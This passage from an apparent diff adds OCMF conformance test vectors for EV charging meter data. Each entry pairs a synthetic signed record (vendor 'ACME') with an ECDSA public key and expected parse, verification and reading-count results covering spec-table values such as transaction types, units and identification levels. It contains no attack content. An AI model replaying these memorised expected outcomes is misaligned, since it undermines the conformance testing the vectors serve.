+   "record": "OCMF|{\"FV\":\"1.3\",\"GI\":\"ocmf conformance\",\"GS\":\"CONF-1\",\"GV\":\"0.1.0\",\"PG\":\"T1\",\"MV\":\"ACME\",\"MM\":\"M-100\",\"MS\":\"1CONF00000001\",\"MF\":\"1.0\",\"IS\":true,\"IL\":\"VERIFIED\",\"IF\":[\"RFID_PLAIN\"],\"IT\":\"ISO14443\",\"ID\":\"1F2D3A4F5506C7\",\"RD\":[{\"TM\":\"2024-03-01T08:00:00,000+0100 S\",\"TX\":\"P\",\"RV\":100.000,\"RI\":\"01-00:B1.08.00*FF\",\"RU\":\"kWh\",\"EF\":\"\",\"ST\":\"G\"}]}|{\"SA\":\"ECDSA-secp256r1-SHA256\",\"SD\":\"3045022100C6CFC51104A8609DEB1B609B8DA0B3BF3611EA2BDE217B424901457C00ED655602206A363C57BCE6CA098A709BCA9B6669CF86F2D1420FCA6B5B201B218F89E6EB4A\"}",
+   "key": "3059301306072A8648CE3D020106082A8648CE3D030107034200040C901D423C831CA85E27C73C263BA132721BB9D7A84C4F0380B2A6756FD601331C8870234DEC878504C174144FA4B14B66A651691606D8173E55BD37E381569E",
+   "expect": { "parses": true, "round_trips": true, "verifies": true, "deviations": [], "readings": 1, "billable_readings": 1 }
+  },
+  {
+   "id": "table/transaction-S",
+   "group": "table",
+   "description": "TX = S [OCMF Tab. 7]",
+   "record": "OCMF|{\"FV\":\"1.3\",\"GI\":\"ocmf conformance\",\"GS\":\"CONF-1\",\"GV\":\"0.1.0\",\"PG\":\"T1\",\"MV\":\"ACME\",\"MM\":\"M-100\",\"MS\":\"1CONF00000001\",\"MF\":\"1.0\",\"IS\":true,\"IL\":\"VERIFIED\",\"IF\":[\"RFID_PLAIN\"],\"IT\":\"ISO14443\",\"ID\":\"1F2D3A4F5506C7\",\"RD\":[{\"TM\":\"2024-03-01T08:00:00,000+0100 S\",\"TX\":\"S\",\"RV\":100.000,\"RI\":\"01-00:B1.08.00*FF\",\"RU\":\"kWh\",\"EF\":\"\",\"ST\":\"G\"}]}|{\"SA\":\"ECDSA-secp256r1-SHA256\",\"SD\":\"30440220360E515A1AF3480B4267088916BCCBBB49AB9007B8B1F6DEC0E816789361F4A6022066D83A277716312D5C3022F5B63AE591B4753A70146475759446F95F4D86D69D\"}",
+   "key": "3059301306072A8648CE3D020106082A8648CE3D030107034200040C901D423C831CA85E27C73C263BA132721BB9D7A84C4F0380B2A6756FD601331C8870234DEC878504C174144FA4B14B66A651691606D8173E55BD37E381569E",
+   "expect": { "parses": true, "round_trips": true, "verifies": true, "deviations": [], "readings": 1, "billable_readings": 1 }
+  },
+  {
+   "id": "table/transaction-T",
+   "group": "table",
+   "description": "TX = T [OCMF Tab. 7]",
+   "record": "OCMF|{\"FV\":\"1.3\",\"GI\":\"ocmf conformance\",\"GS\":\"CONF-1\",\"GV\":\"0.1.0\",\"PG\":\"T1\",\"MV\":\"ACME\",\"MM\":\"M-100\",\"MS\":\"1CONF00000001\",\"MF\":\"1.0\",\"IS\":true,\"IL\":\"VERIFIED\",\"IF\":[\"RFID_PLAIN\"],\"IT\":\"ISO14443\",\"ID\":\"1F2D3A4F5506C7\",\"RD\":[{\"TM\":\"2024-03-01T08:00:00,000+0100 S\",\"TX\":\"T\",\"RV\":100.000,\"RI\":\"01-00:B1.08.00*FF\",\"RU\":\"kWh\",\"EF\":\"\",\"ST\":\"G\"}]}|{\"SA\":\"ECDSA-secp256r1-SHA256\",\"SD\":\"304402201757A9F3C91FDA10625E79780DBD9C040E3CE47864052DFF778246AADD100B5B0220332FE6D80CE09F01022BA905D220E233F49C519094B14208F3FBFDAC59B39649\"}",
+   "key": "3059301306072A8648CE3D020106082A8648CE3D030107034200040C901D423C831CA85E27C73C263BA132721BB9D7A84C4F0380B2A6756FD601331C8870234DEC878504C174144FA4B14B66A651691606D8173E55BD37E381569E",
+   "expect": { "parses": true, "round_trips": true, "verifies": true, "deviations": [], "readings": 1, "billable_readings": 1 }
+  },
+  {
+   "id": "table/unit-kWh",
+   "group": "table",
+   "description": "RU = kWh [OCMF Tab. 20]",
+   "record": "OCMF|{\"FV\":\"1.3\",\"GI\":\"ocmf conformance\",\"GS\":\"CONF-1\",\"GV\":\"0.1.0\",\"PG\":\"T1\",\"MV\":\"ACME\",\"MM\":\"M-100\",\"MS\":\"1CONF00000001\",\"MF\":\"1.0\",\"IS\":true,\"IL\":\"VERIFIED\",\"IF\":[\"RFID_PLAIN\"],\"IT\":\"ISO14443\",\"ID\":\"1F2D3A4F5506C7\",\"RD\":[{\"TM\":\"2024-03-01T08:00:00,000+0100 S\",\"TX\":\"B\",\"RV\":100.000,\"RI\":\"01-00:B1.08.00*FF\",\"RU\":\"kWh\",\"EF\":\"\",\"ST\":\"G\"}]}|{\"SA\":\"ECDSA-secp256r1-SHA256\",\"SD\":\"30450221009C808E96ACD496B14A2215D0FB0B2EA58F05464C6C353709C6EE09ADF3E85373022012E0FD2E90AFCD8652C4D17F0B8E26756679DFFA9B8BB0226CCF643D363442DA\"}",
+   "key": "3059301306072A8648CE3D020106082A8648CE3D030107034200040C901D423C831CA85E27C73C263BA132721BB9D7A84C4F0380B2A6756FD601331C8870234DEC878504C174144FA4B14B66A651691606D8173E55BD37E381569E",
+   "expect": { "parses": true, "round_trips": true, "verifies": true, "deviations": [], "readings": 1, "billable_readings": 1 }
+  },
+  {
+   "id": "table/unit-Wh",
+   "group": "table",
+   "description": "RU = Wh [OCMF Tab. 20]",
+   "record": "OCMF|{\"FV\":\"1.3\",\"GI\":\"ocmf conformance\",\"GS\":\"CONF-1\",\"GV\":\"0.1.0\",\"PG\":\"T1\",\"MV\":\"ACME\",\"MM\":\"M-100\",\"MS\":\"1CONF00000001\",\"MF\":\"1.0\",\"IS\":true,\"IL\":\"VERIFIED\",\"IF\":[\"RFID_PLAIN\"],\"IT\":\"ISO14443\",\"ID\":\"1F2D3A4F5506C7\",\"RD\":[{\"TM\":\"2024-03-01T08:00:00,000+0100 S\",\"TX\":\"B\",\"RV\":100.000,\"RI\":\"01-00:B1.08.00*FF\",\"RU\":\"Wh\",\"EF\":\"\",\"ST\":\"G\"}]}|{\"SA\":\"ECDSA-secp256r1-SHA256\",\"SD\":\"30450221009BBAD96D249CB1EB1A1FADB358A69B0ADEA202473858FDACF9CA25C524AAD72802207CB49B1D6671DFE74B46DADAA9CD57B8F77BEB44018AE76E0D4722DC7ED6421B\"}",
+   "key": "3059301306072A8648CE3D020106082A8648CE3D030107034200040C901D423C831CA85E27C73C263BA132721BB9D7A84C4F0380B2A6756FD601331C8870234DEC878504C174144FA4B14B66A651691606D8173E55BD37E381569E",
+   "expect": { "parses": true, "round_trips": true, "verifies": true, "deviations": [], "readings": 1, "billable_readings": 1 }
+  },
+  {
+   "id": "table/current-AC",
+   "group": "table",
+   "description": "RT = AC [OCMF Tab. 21]",
+   "record": "OCMF|{\"FV\":\"1.3\",\"GI\":\"ocmf conformance\",\"GS\":\"CONF-1\",\"GV\":\"0.1.0\",\"PG\":\"T1\",\"MV\":\"ACME\",\"MM\":\"M-100\",\"MS\":\"1CONF00000001\",\"MF\":\"1.0\",\"IS\":true,\"IL\":\"VERIFIED\",\"IF\":[\"RFID_PLAIN\"],\"IT\":\"ISO14443\",\"ID\":\"1F2D3A4F5506C7\",\"RD\":[{\"TM\":\"2024-03-01T08:00:00,000+0100 S\",\"TX\":\"B\",\"RV\":100.000,\"RI\":\"01-00:B1.08.00*FF\",\"RU\":\"kWh\",\"RT\":\"AC\",\"EF\":\"\",\"ST\":\"G\"}]}|{\"SA\":\"ECDSA-secp256r1-SHA256\",\"SD\":\"3045022100B4165BE3BD7CC1D9DD307B1509C95AD6201468442CFF531B3BA4E198D61D852902202A728116E6BE5E5E52131C8AC5A2DC6EFA2FDEE4A2BC59B3512D1AC1B99541E9\"}",
+   "key": "3059301306072A8648CE3D020106082A8648CE3D030107034200040C901D423C831CA85E27C73C263BA132721BB9D7A84C4F0380B2A6756FD601331C8870234DEC878504C174144FA4B14B66A651691606D8173E55BD37E381569E",
+   "expect": { "parses": true, "round_trips": true, "verifies": true, "deviations": [], "readings": 1, "billable_readings": 1 }
+  },
+  {
+   "id": "table/current-DC",
+   "group": "table",
+   "description": "RT = DC [OCMF Tab. 21]",
+   "record": "OCMF|{\"FV\":\"1.3\",\"GI\":\"ocmf conformance\",\"GS\":\"CONF-1\",\"GV\":\"0.1.0\",\"PG\":\"T1\",\"MV\":\"ACME\",\"MM\":\"M-100\",\"MS\":\"1CONF00000001\",\"MF\":\"1.0\",\"IS\":true,\"IL\":\"VERIFIED\",\"IF\":[\"RFID_PLAIN\"],\"IT\":\"ISO14443\",\"ID\":\"1F2D3A4F5506C7\",\"RD\":[{\"TM\":\"2024-03-01T08:00:00,000+0100 S\",\"TX\":\"B\",\"RV\":100.000,\"RI\":\"01-00:B1.08.00*FF\",\"RU\":\"kWh\",\"RT\":\"DC\",\"EF\":\"\",\"ST\":\"G\"}]}|{\"SA\":\"ECDSA-secp256r1-SHA256\",\"SD\":\"30440220583028797B6A7B2C18938F9E46A2D3533961CDD26869695D1CEE34E71120A45802207BCA8581C58B7132A4445E2F11844DBD5C826522628F0641D8DCADFDE91A0534\"}",
+   "key": "3059301306072A8648CE3D020106082A8648CE3D030107034200040C901D423C831CA85E27C73C263BA132721BB9D7A84C4F0380B2A6756FD601331C8870234DEC878504C174144FA4B14B66A651691606D8173E55BD37E381569E",
+   "expect": { "parses": true, "round_trips": true, "verifies": true, "deviations": [], "readings": 1, "billable_readings": 1 }
+  },
+  {
+   "id": "table/time-status-U",
+   "group": "table",
+   "description": "TM synchronisation state U [OCMF Tab. 19]",
+   "record": "OCMF|{\"FV\":\"1.3\",\"GI\":\"ocmf conformance\",\"GS\":\"CONF-1\",\"GV\":\"0.1.0\",\"PG\":\"T1\",\"MV\":\"ACME\",\"MM\":\"M-100\",\"MS\":\"1CONF00000001\",\"MF\":\"1.0\",\"IS\":true,\"IL\":\"VERIFIED\",\"IF\":[\"RFID_PLAIN\"],\"IT\":\"ISO14443\",\"ID\":\"1F2D3A4F5506C7\",\"RD\":[{\"TM\":\"2024-03-01T08:00:00,000+0100 U\",\"TX\":\"B\",\"RV\":100.000,\"RI\":\"01-00:B1.08.00*FF\",\"RU\":\"kWh\",\"EF\":\"\",\"ST\":\"G\"}]}|{\"SA\":\"ECDSA-secp256r1-SHA256\",\"SD\":\"3044022070A9BB82233602FB0D3E0AFE8D191760E9FC36326706F02F6ABE18931BDD6D380220121F207E6AC44F80AA45FFF791EEC3A8DD919A01D621C5C1470B08D54021D28C\"}",
+   "key": "3059301306072A8648CE3D020106082A8648CE3D030107034200040C901D423C831CA85E27C73C263BA132721BB9D7A84C4F0380B2A6756FD601331C8870234DEC878504C174144FA4B14B66A651691606D8173E55BD37E381569E",
+   "expect": { "parses": true, "round_trips": true, "verifies": true, "deviations": [], "readings": 1, "billable_readings": 1 }
+  },
+  {
+   "id": "table/time-status-I",
+   "group": "table",
+   "description": "TM synchronisation state I [OCMF Tab. 19]",
+   "record": "OCMF|{\"FV\":\"1.3\",\"GI\":\"ocmf conformance\",\"GS\":\"CONF-1\",\"GV\":\"0.1.0\",\"PG\":\"T1\",\"MV\":\"ACME\",\"MM\":\"M-100\",\"MS\":\"1CONF00000001\",\"MF\":\"1.0\",\"IS\":true,\"IL\":\"VERIFIED\",\"IF\":[\"RFID_PLAIN\"],\"IT\":\"ISO14443\",\"ID\":\"1F2D3A4F5506C7\",\"RD\":[{\"TM\":\"2024-03-01T08:00:00,000+0100 I\",\"TX\":\"B\",\"RV\":100.000,\"RI\":\"01-00:B1.08.00*FF\",\"RU\":\"kWh\",\"EF\":\"\",\"ST\":\"G\"}]}|{\"SA\":\"ECDSA-secp256r1-SHA256\",\"SD\":\"3044022053262ECA24BE1A7100B38D662CFB98C71D0B5037E438B85AD18CA262A5E33D68022079209831EAF2360ABB3578BF0CC20094A4CF97F70320542E4FE4AAD190DEB826\"}",
+   "key": "3059301306072A8648CE3D020106082A8648CE3D030107034200040C901D423C831CA85E27C73C263BA132721BB9D7A84C4F0380B2A6756FD601331C8870234DEC878504C174144FA4B14B66A651691606D8173E55BD37E381569E",
+   "expect": { "parses": true, "round_trips": true, "verifies": true, "deviations": [], "readings": 1, "billable_readings": 1 }
+  },
+  {
+   "id": "table/time-status-S",
+   "group": "table",
+   "description": "TM synchronisation state S [OCMF Tab. 19]",
+   "record": "OCMF|{\"FV\":\"1.3\",\"GI\":\"ocmf conformance\",\"GS\":\"CONF-1\",\"GV\":\"0.1.0\",\"PG\":\"T1\",\"MV\":\"ACME\",\"MM\":\"M-100\",\"MS\":\"1CONF00000001\",\"MF\":\"1.0\",\"IS\":true,\"IL\":\"VERIFIED\",\"IF\":[\"RFID_PLAIN\"],\"IT\":\"ISO14443\",\"ID\":\"1F2D3A4F5506C7\",\"RD\":[{\"TM\":\"2024-03-01T08:00:00,000+0100 S\",\"TX\":\"B\",\"RV\":100.000,\"RI\":\"01-00:B1.08.00*FF\",\"RU\":\"kWh\",\"EF\":\"\",\"ST\":\"G\"}]}|{\"SA\":\"ECDSA-secp256r1-SHA256\",\"SD\":\"30450221009C808E96ACD496B14A2215D0FB0B2EA58F05464C6C353709C6EE09ADF3E85373022012E0FD2E90AFCD8652C4D17F0B8E26756679DFFA9B8BB0226CCF643D363442DA\"}",
+   "key": "3059301306072A8648CE3D020106082A8648CE3D030107034200040C901D423C831CA85E27C73C263BA132721BB9D7A84C4F0380B2A6756FD601331C8870234DEC878504C174144FA4B14B66A651691606D8173E55BD37E381569E",
+   "expect": { "parses": true, "round_trips": true, "verifies": true, "deviations": [], "readings": 1, "billable_readings": 1 }
+  },
+  {
+   "id": "table/time-status-R",
+   "group": "table",
+   "description": "TM synchronisation state R [OCMF Tab. 19]",
+   "record": "OCMF|{\"FV\":\"1.3\",\"GI\":\"ocmf conformance\",\"GS\":\"CONF-1\",\"GV\":\"0.1.0\",\"PG\":\"T1\",\"MV\":\"ACME\",\"MM\":\"M-100\",\"MS\":\"1CONF00000001\",\"MF\":\"1.0\",\"IS\":true,\"IL\":\"VERIFIED\",\"IF\":[\"RFID_PLAIN\"],\"IT\":\"ISO14443\",\"ID\":\"1F2D3A4F5506C7\",\"RD\":[{\"TM\":\"2024-03-01T08:00:00,000+0100 R\",\"TX\":\"B\",\"RV\":100.000,\"RI\":\"01-00:B1.08.00*FF\",\"RU\":\"kWh\",\"EF\":\"\",\"ST\":\"G\"}]}|{\"SA\":\"ECDSA-secp256r1-SHA256\",\"SD\":\"3045022100D01DB8E13CAC7092398F266F93B8B6792D2581913F8BDCEEC341077A357832BD02203C9143977AB2BD6E7E249C09A0925EE3AA6308BB08FB7B9F6FE32A23A7DEC024\"}",
+   "key": "3059301306072A8648CE3D020106082A8648CE3D030107034200040C901D423C831CA85E27C73C263BA132721BB9D7A84C4F0380B2A6756FD601331C8870234DEC878504C174144FA4B14B66A651691606D8173E55BD37E381569E",
+   "expect": { "parses": true, "round_trips": true, "verifies": true, "deviations": [], "readings": 1, "billable_readings": 1 }
+  },
+  {
+   "id": "table/id-level-NONE",
+   "group": "table",
+   "description": "IL = NONE [OCMF Tab. 11]",
+   "record": "OCMF|{\"FV\":\"1.3\",\"GI\":\"ocmf conformance\",\"GS\":\"CONF-1\",\"GV\":\"0.1.0\",\"PG\":\"T1\",\"MV\":\"ACME\",\"MM\":\"M-100\",\"MS\":\"1CONF00000001\",\"MF\":\"1.0\",\"IS\":true,\"IL\":\"NONE\",\"IF\":[\"RFID_PLAIN\"],\"IT\":\"ISO14443\",\"ID\":\"1F2D3A4F5506C7\",\"RD\":[{\"TM\":\"2024-03-01T08:00:00,000+0100 S\",\"TX\":\"B\",\"RV\":100.000,\"RI\":\"01-00:B1.08.00*FF\",\"RU\":\"kWh\",\"RT\":\"DC\",\"EF\":\"\",\"ST\":\"G\"},{\"TM\":\"2024-03-01T09:30:00,000+0100 S\",\"TX\":\"E\",\"RV\":129.500,\"RI\":\"01-00:B1.08.00*FF\",\"RU\":\"kWh\",\"RT\":\"DC\",\"EF\":\"\",\"ST\":\"G\"}]}|{\"SA\":\"ECDSA-secp256r1-SHA256\",\"SD\":\"304402202AC094A5140CB015B66B693C8C8AA3A127822DC597AE7749A10A7153C444F8C902200A41064514EA245D2E0840CDA77BEB0377CD0DDCDE809E5B52C1BCD962892D55\"}",
+   "key": "3059301306072A8648CE3D020106082A8648CE3D030107034200040C901D423C831CA85E27C73C263BA132721BB9D7A84C4F0380B2A6756FD601331C8870234DEC878504C174144FA4B14B66A651691606D8173E55BD37E381569E",
+   "expect": { "parses": true, "round_trips": true, "verifies": true, "deviations": [], "readings": 2, "billable_readings": 2 }
+  },
+  {
+   "id": "table/id-level-HEARSAY",
+   "group": "table",
+   "description": "IL = HEARSAY [OCMF Tab. 11]",
+   "record": "OCMF|{\"FV\":\"1.3\",\"GI\":\"ocmf conformance\",\"GS\":\"CONF-1\",\"GV\":\"0.1.0\",\"PG\":\"T1\",\"MV\":\"ACME\",\"MM\":\"M-100\",\"MS\":\"1CONF00000001\",\"MF\":\"1.0\",\"IS\":true,\"IL\":\"HEARSAY\",\"IF\":[\"RFID_PLAIN\"],\"IT\":\"ISO14443\",\"ID\":\"1F2D3A4F5506C7\",\"RD\":[{\"TM\":\"2024-03-01T08:00:00,000+0100 S\",\"TX\":\"B\",\"RV\":100.000,\"RI\":\"01-00:B1.08.00*FF\",\"RU\":\"kWh\",\"RT\":\"DC\",\"EF\":\"\",\"ST\":\"G\"},{\"TM\":\"2024-03-01T09:30:00,000+0100 S\",\"TX\":\"E\",\"RV\":129.500,\"RI\":\"01-00:B1.08.00*FF\",\"RU\":\"kWh\",\"RT\":\"DC\",\"EF\":\"\",\"ST\":\"G\"}]}|{\"SA\":\"ECDSA-secp256r1-SHA256\",\"SD\":\"3045022100B0E596143F9C220B9FC27EF33407900D7F031024D02B805C13DD19CE4208E6F502201E2D7024800EC045FFC6C5DF5F97335421E57B6BE68758EEFFD1B6C7F58871FF\"}",
+   "key": "3059301306072A8648CE3D020106082A8648CE3D030107034200040C901D423C831CA85E27C73C263BA132721BB9D7A84C4F0380B2A6756FD601331C8870234DEC878504C174144FA4B14B66A651691606D8173E55BD37E381569E",
+   "expect": { "parses": true, "round_trips": true, "verifies": true, "deviations": [], "readings": 2, "billable_readings": 2 }
+  },
+  {
+   "id": "table/id-level-TRUSTED",
+   "group": "table",
+   "description": "IL = TRUSTED [OCMF Tab. 11]",
+   "record": "OCMF|{\"FV\":\"1.3\",\"GI\":\"ocmf conformance\",\"GS\":\"CONF-1\",\"GV\":\"0.1.0\",\"PG\":\"T1\",\"MV\":\"ACME\",\"MM\":\"M-100\",\"MS\":\"1CONF00000001\",\"MF\":\"1.0\",\"IS\":true,\"IL\":\"TRUSTED\",\"IF\":[\"RFID_PLAIN\"],\"IT\":\"ISO14443\",\"ID\":\"1F2D3A4F5506C7\",\"RD\":[{\"TM\":\"2024-03-01T08:00:00,000+0100 S\",\"TX\":\"B\",\"RV\":100.000,\"RI\":\"01-00:B1.08.00*FF\",\"RU\":\"kWh\",\"RT\":\"DC\",\"EF\":\"\",\"ST\":\"G\"},{\"TM\":\"2024-03-01T09:30:00,000+0100 S\",\"TX\":\"E\",\"RV\":129.500,\"RI\":\"01-00:B1.08.00*FF\",\"RU\":\"kWh\",\"RT\":\"DC\",\"EF\":\"\",\"ST\":\"G\"}]}|{\"SA\":\"ECDSA-secp256r1-SHA256\",\"SD\":\"3045022100E8FB71B91D70C8FB7B3DAB587326B5C97B18E83E34586DBA4195FCF01109D2B502206A65955C79ACEE26F96D6CF1E1ACA0D18ACAE1DD7DC9D0F49E9634F40681D27F\"}",
+   "key": "3059301306072A8648CE3D020106082A8648CE3D030107034200040C901D423C831CA85E27C73C263BA132721BB9D7A84C4F0380B2A6756FD601331C8870234DEC878504C174144FA4B14B66A651691606D8173E55BD37E381569E",
+   "expect": { "parses": true, "round_trips": true, "verifies": true, "deviations": [], "readings": 2, "billable_readings": 2 }
+  },
+  {
+   "id": "table/id-level-VERIFIED",
+   "group": "table",
+   "description": "IL = VERIFIED [OCMF Tab. 11]",
+   "record": "OCMF|{\"FV\":\"1.3\",\"GI\":\"ocmf conformance\",\"GS\":\"CONF-1\",\"GV\":\"0.1.0\",\"PG\":\"T1\",\"MV\":\"ACME\",\"MM\":\"M-100\",\"MS\":\"1CONF00000001\",\"MF\":\"1.0\",\"IS\":true,\"IL\":\"VERIFIED\",\"IF\":[\"RFID_PLAIN\"],\"IT\":\"ISO14443\",\"ID\":\"1F2D3A4F5506C7\",\"RD\":[{\"TM\":\"2024-03-01T08:00:00,000+0100 S\",\"TX\":\"B\",\"RV\":100.000,\"RI\":\"01-00:B1.08.00*FF\",\"RU\":\"kWh\",\"RT\":\"DC\",\"EF\":\"\",\"ST\":\"G\"},{\"TM\":\"2024-03-01T09:30:00,000+0100 S\",\"TX\":\"E\",\"RV\":129.500,\"RI\":\"01-00:B1.08.00*FF\",\"RU\":\"kWh\",\"RT\":\"DC\",\"EF\":\"\",\"ST\":\"G\"}]}|{\"SA\":\"ECDSA-secp256r1-SHA256\",\"SD\":\"3045022100E1834E24BB331913FE72059FD1C588698CE066EEB11A89A1BA38429F85C0F0F40220455194C22931D4D16580C3033DF6497BA656DBD1BD728710CC3D9FCC0BF9AE12\"}",
+   "key": "3059301306072A8648CE3D020106082A8648CE3D030107034200040C901D423C831CA85E27C73C263BA132721BB9D7A84C4F0380B2A6756FD601331C8870234DEC878504C174144FA4B14B66A651691606D8173E55BD37E381569E",
+   "expect": { "parses": true, "round_trips": true, "verifies": true, "deviations": [], "readings": 2, "billable_readings": 2 }
+  },
+  {
+   "id": "table/id-level-CERTIFIED",
+   "group": "table",
+   "description": "IL = CERTIFIED [OCMF Tab. 11]",
+   "record": "OCMF|{\"FV\":\"1.3\",\"GI\":\"ocmf conformance\",\"GS\":\"CONF-1\",\"GV\":\"0.1.0\",\"PG\":\"T1\",\"MV\":\"ACME\",\"MM\":\"M-100\",\"MS\":\"1CONF00000001\",\"MF\":\"1.0\",\"IS\":true,\"IL\":\"CERTIFIED\",\"IF\":[\"RFID_PLAIN\"],\"IT\":\"ISO14443\",\"ID\":\"1F2D3A4F5506C7\",\"RD\":[{\"TM\":\"2024-03-01T08:00:00,000+0100 S\",\"TX\":\"B\",\"RV\":100.000,\"RI\":\"01-00:B1.08.00*FF\",\"RU\":\"kWh\",\"RT\":\"DC\",\"EF\":\"\",\"ST\":\"G\"},{\"TM\":\"2024-03-01T09:30:00,000+0100 S\",\"TX\":\"E\",\"RV\":129.500,\"RI\":\"01-00:B1.08.00*FF\",\"RU\":\"kWh\",\"RT\":\"DC\",\"EF\":\"\",\"ST\":\"G\"}]}|{\"SA\":\"ECDSA-secp256r1-SHA256\",\"SD\":\"3045022100A75396C8DBE6D28842D5FE641E502570DCE3BB096947592EC7CCF2DB356CE4A50220028FB11964BC9E0DED7934870C27CB0E9B28E6D5CD0CB4EA545361971B69E676\"}",
+   "key": "3059301306072A8648CE3D020106082A8648CE3D030107034200040C901D423C831CA85E27C73C263BA132721BB9D7A84C4F0380B2A6756FD601331C8870234DEC878504C174144FA4B14B66A651691606D8173E55BD37E381569E",
+   "expect": { "parses": true, "round_trips": true, "verifies": true, "deviations": [], "readings": 2, "billable_readings": 2 }
+  },
+  {
+   "id": "table/id-level-SECURE",
+   "group": "table",
+   "description": "IL = SECURE [OCMF Tab. 11]",
+   "record": "OCMF|{\"FV\":\"1.3\",\"GI\":\"ocmf conformance\",\"GS\":\"CONF-1\",\"GV\":\"0.1.0\",\"PG\":\"T1\",\"MV\":\"ACME\",\"MM\":\"M-100\",\"MS\":\"1CONF00000001\",\"MF\":\"1.0\",\"IS\":true,\"IL\":\"SECURE\",\"IF\":[\"RFID_PLAIN\"],\"IT\":\"ISO14443\",\"ID\":\"1F2D3A4F5506C7\",\"RD\":[{\"TM\":\"2024-03-01T08:00:00,000+0100 S\",\"TX\":\"B\",\"RV\":100.000,\"RI\":\"01-00:B1.08.00*FF\",\"RU\":\"kWh\",\"RT\":\"DC\",\"EF\":\"\",\"ST\":\"G\"},{\"TM\":\"2024-03-01T09:30:00,000+0100 S\",\"TX\":\"E\",\"RV\":129.500,\"RI\":\"01-00:B1.08.00*FF\",\"RU\":\"kWh\",\"RT\":\"DC\",\"EF\":\"\",\"ST\":\"G\"}]}|{\"SA\":\"ECDSA-secp256r1-SHA256\",\"SD\":\"304502210085F3066A7496BE8BB05B8B606F17A21140DA0A1AE9DF91B63D3FBA7A456068CF022005E8579035F21B7DB6116AC90DC86A05CDDE0F8505FF774A02365D3CB73B0050\"}",
+   "key": "3059301306072A8648CE3D020106082A8648CE3D030107034200040C901D423C831CA85E27C73C263BA132721BB9D7A84C4F0380B2A6756FD601331C8870234DEC878504C174144FA4B14B66A651691606D8173E55BD37E381569E",
+   "expect": { "parses": true, "round_trips": true, "verifies": true, "deviations": [], "readings": 2, "billable_readings": 2 }
+  },
+  {
+   "id": "table/id-level-MISMATCH",
+   "group": "table",
+   "description": "IL = MISMATCH [OCMF Tab. 11]",
+   "record": "OCMF|{\"FV\":\"1.3\",\"GI\":\"ocmf conformance\",\"GS\":\"CONF-1\",\"GV\":\"0.1.0\",\"PG\":\"T1\",\"MV\":\"ACME\",\"MM\":\"M-100\",\"MS\":\"1CONF00000001\",\"MF\":\"1.0\",\"IS\":true,\"IL\":\"MISMATCH\",\"IF\":[\"RFID_PLAIN\"],\"IT\":\"ISO14443\",\"ID\":\"1F2D3A4F5506C7\",\"RD\":[{\"TM\":\"2024-03-01T08:00:00,000+0100 S\",\"TX\":\"B\",\"RV\":100.000,\"RI\":\"01-00:B1.08.00*FF\",\"RU\":\"kWh\",\"RT\":\"DC\",\"EF\":\"\",\"ST\":\"G\"},{\"TM\":\"2024-03-01T09:30:00,000+0100 S\",\"TX\":\"E\",\"RV\":129.500,\"RI\":\"01-00:B1.08.00*FF\",\"RU\":\"kWh\",\"RT\":\"DC\",\"EF\":\"\",\"ST\":\"G\"}]}|{\"SA\":\"ECDSA-secp256r1-SHA256\",\"SD\":\"304402201B4830F5E881EA05AC8E579330CED734176C5E51B44FBDEE3EAA7BC74A383C9F02200C6B70894CF7C7570FCECC2F1C3D3747767845B86DECEF48A861A630A0BE242D\"}",
+   "key": "3059301306072A8648CE3D020106082A8648CE3D030107034200040C901D423C831CA85E27C73C263BA132721BB9D7A84C4F0380B2A6756FD601331C8870234DEC878504C174144FA4B14B66A651691606D8173E55BD37E381569E",
+   "expect": { "parses": true, "round_trips": true, "verifies": true, "deviations": [], "readings": 2, "billable_readings": 2 }
+  },
+  {
+   "id": "table/id-level-INVALID",
+   "group": "table",
+   "description": "IL = INVALID [OCMF Tab. 11]",
+   "record": "OCMF|{\"FV\":\"1.3\",\"GI\":\"ocmf conformance\",\"GS\":\"CONF-1\",\"GV\":\"0.1.0\",\"PG\":\"T1\",\"MV\":\"ACME\",\"MM\":\"M-100\",\"MS\":\"1CONF00000001\",\"MF\":\"1.0\",\"IS\":true,\"IL\":\"INVALID\",\"IF\":[\"RFID_PLAIN\"],\"IT\":\"ISO14443\",\"ID\":\"1F2D3A4F5506C7\",\"RD\":[{\"TM\":\"2024-03-01T08:00:00,000+0100 S\",\"TX\":\"B\",\"RV\":100.000,\"RI\":\"01-00:B1.08.00*FF\",\"RU\":\"kWh\",\"RT\":\"DC\",\"EF\":\"\",\"ST\":\"G\"},{\"TM\":\"2024-03-01T09:30:00,000+0100 S\",\"TX\":\"E\",\"RV\":129.500,\"RI\":\"01-00:B1.08.00*FF\",\"RU\":\"kWh\",\"RT\":\"DC\",\"EF\":\"\",\"ST\":\"G\"}]}|{\"SA\":\"ECDSA-secp256r1-SHA256\",\"SD\":\"304402202140DE822DD67DACCA22ACB831BA266CD3CFBB9B248CF4F646FDB16D11A66918022066BBAC0AFEAAD443B9B8B512D8E443ACE1E8D5B48D09829B7BEE3FB40680F8C5\"}",
+   "key": "3059301306072A8648CE3D020106082A8648CE3D030107034200040C901D423C831CA85E27C73C263BA132721BB9D7A84C4F0380B2A6756FD601331C8870234DEC878504C174144FA4B14B66A651691606D8173E55BD37E381569E",
+   "expect": { "parses": true, "round_trips": true, "verifies": true, "deviations": [], "readings": 2, "billable_readings": 2 }
+  },
+  {
+   "id": "table/id-level-OUTDATED",
+   "group": "table",
+   "description": "IL = OUTDATED [OCMF Tab. 11]",
+   "record": "OCMF|{\"FV\":\"1.3\",\"GI\":\"ocmf conformance\",\"GS\":\"CONF-1\",\"GV\":\"0.1.0\",\"PG\":\"T1\",\"MV\":\"ACME\",\"MM\":\"M-100\",\"MS\":\"1CONF00000001\",\"MF\":\"1.0\",\"IS\":true,\"IL\":\"OUTDATED\",\"IF\":[\"RFID_PLAIN\"],\"IT\":\"ISO14443\",\"ID\":\"1F2D3A4F5506C7\",\"RD\":[{\"TM\":\"2024-03-01T08:00:00,000+0100 S\",\"TX\":\"B\",\"RV\":100.000,\"RI\":\"01-00:B1.08.00*FF\",\"RU\":\"kWh\",\"RT\":\"DC\",\"EF\":\"\",\"ST\":\"G\"},{\"TM\":\"2024-03-01T09:30:00,000+0100 S\",\"TX\":\"E\",\"RV\":129.500,\"RI\":\"01-00:B1.08.00*FF\",\"RU\":\"kWh\",\"RT\":\"DC\",\"EF\":\"\",\"ST\":\"G\"}]}|{\"SA\":\"ECDSA-secp256r1-SHA256\",\"SD\":\"304402207783D1D439CB847B3A22E07683F10A3F9990692662B9D355C363FB3423C4251F02203820E9E0ACFE6A85138F17428DD5BAA3846F8D88A27A21AE43C5A4CC7DE95319\"}",
